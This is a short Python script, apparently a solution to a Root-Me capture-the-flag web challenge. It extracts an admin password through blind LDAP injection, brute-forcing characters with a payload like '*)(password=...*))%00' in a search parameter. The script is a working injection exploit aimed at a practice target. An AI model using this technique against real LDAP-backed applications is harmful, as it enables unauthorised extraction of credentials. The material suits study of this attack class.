import requests
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry
import string
def requests_retry_session(
retries=10,
backoff_factor=0.3,
status_forcelist=(500, 502, 504),
session=None
):
session = session or requests.Session()
retry = Retry(
total=retries,
 
read=retries,
connect=retries,
backoff_factor=backoff_factor,
status_forcelist=status_forcelist,
)
adapter = HTTPAdapter(max_retries=retry)
session.mount('http://', adapter)
session.mount('https://', adapter)
return session
""" hihi """
char=string.letters+string.digits+"_@"
url="http://challenge01.root-me.org/web-serveur/ch26/?action=dir&search=admin@ch26*)(password="
flag=""
for i in range(1,33):
for x in char:
print url+flag+x+"*))%00"
r=requests_retry_session().get(url+flag+x+"*))%00")
if "admin" in r.content:
flag+=x
break
print flag
